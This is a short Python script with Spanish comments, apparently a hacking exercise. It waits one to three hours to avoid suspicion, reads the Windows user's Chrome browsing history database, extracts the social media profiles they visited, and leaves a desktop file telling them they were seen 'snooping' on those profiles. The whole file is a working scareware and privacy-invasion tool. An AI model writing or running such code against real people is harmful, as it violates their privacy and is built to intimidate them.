import sqlite3
from pathlib import Path
from time import sleep
from random import randrange
import re

HACKER_FILE_NAME = "Leeme.txt"


def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    number_of_hours = randrange(1, 4)
    print("Dormire {} horas.".format(number_of_hours))
    sleep(number_of_hours * 60 * 60)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)


def check_visited_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        results_of_youtube = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        results_of_facebook = re.findall("https://www.facebook.com/([A-Za-z0-9]+)$", item[2])

        results = []
        for result in results_of_twitter:
            results.append(result)
        for result in results_of_youtube:
            results.append(result)
        for result in results_of_facebook:
            results.append(result)

        if results and results[0] not in ["notificacions", "home"] and results[0] not in profiles_visited:
            profiles_visited.append(results[0])


    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))


def main():
    # Esperamos entre 1-3 horas para no levantar sospechas
    delay_action()

    # Calculamos la ruta del usuario de windows
    user_path = get_user_path()

    # Recogemos su historial de Google Chrome (cuando sea posible)
    chrome_history = get_chrome_history(user_path)

    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)

    # Escribiendo mensajes de miedo
    check_visited_profiles_and_scare_user(hacker_file, chrome_history)


if __name__ == "__main__":
    main()